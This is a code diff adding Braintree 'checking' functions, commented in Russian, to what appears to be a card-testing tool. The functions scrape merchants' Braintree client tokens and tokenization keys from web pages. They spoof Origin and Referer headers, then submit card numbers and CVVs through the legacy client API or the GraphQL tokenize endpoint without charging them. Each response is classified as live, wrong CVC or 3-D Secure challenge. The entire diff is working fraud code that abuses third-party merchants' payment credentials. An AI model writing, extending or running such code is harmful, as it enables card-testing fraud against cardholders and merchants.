@@ -877,6 +877,155 @@ async def token_only_check(s, pk: str, card_raw: str, referrer: str,
     return {"status": classify_verdict(msg + code), "detail": msg}
 
 
+RE_BRAINTREE_SETUP = re.compile(r'braintree\.setup\(\s*["\']([^"\']+)["\']')
+RE_BRAINTREE_DATA_TOKEN = re.compile(r'data-braintree-token="([^"]+)"')
+RE_BRAINTREE_CLIENT_TOKEN = re.compile(r'["\']((?:ey[A-Za-z0-9_-]{80,}\.?){1,2})["\']')
+RE_BRAINTREE_TK = re.compile(r'(sandbox|production|development)_tk\w{10,}')
+
+
+def extract_braintree_keys(html: str) -> dict:
+    """Фаза 5.1: маркеры Braintree на странице -> client_token / tokenization_key."""
+    out = {"has_braintree": False, "client_token": "", "tokenization_key": ""}
+    m = RE_BRAINTREE_CLIENT_TOKEN.search(html)
+    if m:
+        out["has_braintree"] = True
+        out["client_token"] = m.group(1)
+    m2 = RE_BRAINTREE_TK.search(html)
+    if m2:
+        out["has_braintree"] = True
+        out["tokenization_key"] = m2.group(0)
+    if RE_BRAINTREE_SETUP.search(html) or RE_BRAINTREE_DATA_TOKEN.search(html):
+        out["has_braintree"] = True
+    return out
+
+
+def braintree_parse_client_token(ct_b64: str) -> dict:
+    """client_token = base64(JSON{authorizationFingerprint, clientApiUrl,...})."""
+    import base64
+    import json as _json
+    pad = ct_b64 + "=" * (-len(ct_b64) % 4)
+    try:
+        d = _json.loads(base64.urlsafe_b64decode(pad))
+    except Exception:
+        return {}
+    fp = d.get("authorizationFingerprint", "")
+    url = d.get("configUrl", "")
+    mid = ""
+    if "/merchants/" in url:
+        mid = url.split("/merchants/")[1].split("/")[0]
+    return {"fingerprint": fp, "client_api_url": url, "merchant_id": mid}
+
+
+async def braintree_vbv_check(s, html: str, card_raw: str,
+                              referrer: str) -> dict:
+    """Фаза 5.1: Braintree tokenize без списания -> живость карты по
+    cvvResponseCode (M/N/S), 3DS-поля если отдаёт мерчант. Возвращает
+    {status, detail}."""
+    import json as _json
+    keys = extract_braintree_keys(html)
+    if not keys["has_braintree"]:
+        return {"status": "ERROR", "detail": "no braintree markers on page"}
+    card = parse_card(card_raw)
+    headers = {
+        "Origin": referrer.rstrip("/"),
+        "Referer": referrer,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
+    }
+    # Путь А: client_token -> fingerprint -> legacy client_api
+    ct = braintree_parse_client_token(keys["client_token"]) if keys["client_token"] else {}
+    body: dict = {}
+    api_url = ""
+    if ct.get("fingerprint"):
+        api_url = (ct["client_api_url"].replace("/client_api", "")
+                   + "/client_api/v1/payment_methods/credit_cards"
+                   if "/client_api" not in ct["client_api_url"]
+                   else ct["client_api_url"] + "/v1/payment_methods/credit_cards")
+        body = {
+            "authorizationFingerprint": ct["fingerprint"],
+            "sharedCustomerIdentifierType": "undefined",
+            "sharedCustomerIdentifier": "",
+            "payment_method_nonce": "",
+            "creditCard[cardholderName]": "",
+            "creditCard[number]": card["number"],
+            "creditCard[expirationMonth]": card["mm"],
+            "creditCard[expirationYear]": card["yy"],
+            "creditCard[cvv]": card["cvc"],
+            "billingAddress[postal_code]": "",
+        }
+    elif keys["tokenization_key"]:
+        # Путь Б: токенизационный ключ -> GraphQL tokenizeCreditCard
+        tkq = {
+            "clientSdkMetadata": {"source": "form", "integration": "custom",
+                                  "sessionId": uuid.uuid4().hex},
+            "query": ("mutation Tokenize($input: TokenizeCreditCardInput!) "
+                      "{ tokenizeCreditCard(input: $input) { paymentMethod { id "
+                      "... on CreditCard { bin { identifiers prepaid healthcare "
+                      "debit durbinRegulated commercial payroll issuingBank "
+                      "countryOfIssuance productId } cardType last4 "
+                      "expirationMonth expirationYear cvvResponseCode } } } }"),
+            "variables": {"input": {"creditCard": {
+                "number": card["number"],
+                "expirationMonth": card["mm"],
+                "expirationYear": card["yy"],
+                "cvv": card["cvc"]},
+                "options": {"validate": False}}},
+            "operationName": "Tokenize",
+        }
+        r = await s.post("https://payments.braintree-api.com/graphql",
+                         json={**tkq, "metaData": {"tokenizationKey": keys["tokenization_key"]}},
+                         headers={"Origin": "https://assets.braintreegateway.com",
+                                  "Content-Type": "application/json"}, timeout=12)
+        try:
+            d = r.json()
+            pm = ((d.get("data") or {}).get("tokenizeCreditCard") or {}).get("paymentMethod") or {}
+        except Exception:
+            return {"status": "ERROR", "detail": f"gql HTTP {r.status_code}"}
+        if not pm:
+            errs = ((d.get("errors") or [{}])[0])
+            msg = str(errs.get("message", ""))[:120]
+            cat = str(errs.get("extensions", {}).get("errorClass", ""))
+            if cat == "VALIDATION":
+                return {"status": "INVALID", "detail": msg}
+            return {"status": "RESTRICTED", "detail": msg}
+        return _braintree_verdict(pm)
+        # путь А продолжается ниже
+    if not body:
+        return {"status": "ERROR", "detail": "no usable braintree credential"}
+    try:
+        r = await s.post(api_url, data=body, headers=headers, timeout=12)
+        d = _json.loads(r.text)
+    except Exception as e:
+        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:150]}
+    ccs = d.get("creditCards") or []
+    if ccs:
+        return _braintree_verdict(ccs[0])
+    err = d.get("fieldErrors") or d.get("message") or d.get("error", {}).get("message")
+    msg = _json.dumps(err)[:150] if err else f"HTTP {r.status_code}"
+    if "invalid" in msg.lower() or "Number" in msg:
+        return {"status": "INVALID", "detail": msg}
+    return {"status": "ERROR", "detail": msg}
+
+
+def _braintree_verdict(pm: dict) -> tuple[str, str] | dict:
+    """Единый разбор ответа токенизации для обоих путей."""
+    cvv_code = str(pm.get("cvvResponseCode") or "").upper()
+    card_type = pm.get("cardType") or "?"
+    last4 = pm.get("last4") or "?"
+    tds = pm.get("threeDSecureInfo") or {}
+    detail = f"{card_type} ****{last4} cvv={cvv_code or '?'}"
+    if tds.get("enrolled"):
+        detail += f" 3ds={'Y' if tds.get('liabilityShifted') else 'C'}"
+    if cvv_code == "N":
+        return {"status": "WRONG_CVC", "detail": detail}
+    if cvv_code in ("M", "S"):
+        status = "APPROVED"
+        if tds.get("enrolled"):
+            status = "3DS_FRICTIONLESS" if tds.get("liabilityShifted") else "3DS_CHALLENGE"
+        return {"status": status, "detail": detail}
+    return {"status": "INVALID", "detail": f"{card_type} ****{last4} rejected"}
+
+
 async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                             country: str = "US",
                             max_price_cents: int = 200) -> dict:
